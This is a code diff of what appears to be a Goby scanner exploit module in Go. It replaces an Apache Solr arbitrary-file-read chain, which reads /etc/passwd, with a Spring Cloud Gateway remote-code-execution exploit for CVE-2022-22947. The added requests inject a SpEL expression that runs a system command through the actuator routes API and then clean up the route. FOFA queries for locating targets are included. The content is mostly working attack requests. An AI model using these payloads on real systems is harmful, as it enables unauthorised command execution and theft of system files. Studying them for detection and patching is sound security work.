@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Apache Solr 任意文件读取",
+  "Name": "Spring Cloud Gateway RCE CVE-2022-22947",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "app=\"APACHE-Solr\" || product=\"APACHE-Solr\"",
-  "GobyQuery": "app=\"APACHE-Solr\" || product=\"APACHE-Solr\"",
+  "FofaQuery": "app=\"Spring\" || product=\"SpringBoot\"",
+  "GobyQuery": "app=\"Spring\" || product=\"SpringBoot\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,10 +29,64 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
+        "method": "POST",
+        "uri": "/actuator/gateway/routes/ovO0h58",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/json"
+        },
+        "data_type": "text",
+        "data": "{\"id\": \"ovO0h58\", \"filters\": [{\"name\": \"AddResponseHeader\", \"args\": {\"name\": \"Result\", \"value\": \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\\"whoami\\\").getInputStream()))}\"}}], \"uri\": \"http://127.0.0.1\", \"order\": 0}"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "201",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/actuator/gateway/refresh",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/actuator/gateway/routes/ovO0h58",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
         "data_type": "text",
         "data": ""
       },
@@ -51,42 +105,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "responseHeader",
-            "bz": ""
-          }
-        ]
-      },
-      "SetVariable": [
-        "core_name|lastbody|regex|\"name\":\"(.*?)\""
-      ]
-    },
-    {
-      "Request": {
-        "method": "POST",
-        "uri": "/solr/{{{core_name}}}/config",
-        "follow_redirect": true,
-        "header": {
-          "Content-Type": "application/json"
-        },
-        "data_type": "text",
-        "data": "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
-      },
-      "ResponseTest": {
-        "type": "group",
-        "operation": "AND",
-        "checks": [
-          {
-            "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
-            "variable": "$body",
-            "operation": "contains",
-            "value": "responseHeader",
+            "value": "AddResponseHeader Result",
             "bz": ""
           }
         ]
@@ -95,12 +114,14 @@ func init() {
     },
     {
       "Request": {
-        "method": "POST",
-        "uri": "/solr/{{{core_name}}}/debug/dump?param=ContentStreams",
+        "method": "DELETE",
+        "uri": "/actuator/gateway/routes/ovO0h58",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
         "data_type": "text",
-        "data": "stream.url=file:///etc/passwd"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -111,13 +132,6 @@ func init() {
             "variable": "$code",
             "operation": "==",
             "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
-            "variable": "$body",
-            "operation": "contains",
-            "value": "root:",
             "bz": ""
           }
         ]
@@ -130,7 +144,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "",
+        "uri": "/test.php",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -151,7 +165,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "",
+            "value": "test",
             "bz": ""
           }
         ]
@@ -173,7 +187,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Apache Solr 任意文件读取",
+      "Name": "Spring Cloud Gateway RCE CVE-2022-22947",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -182,7 +196,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Apache Solr File Read",
+      "Name": "Spring Cloud Gateway RCE CVE-2022-22947",
       "Product": "",
       "Description": "",
       "Recommendation": "",
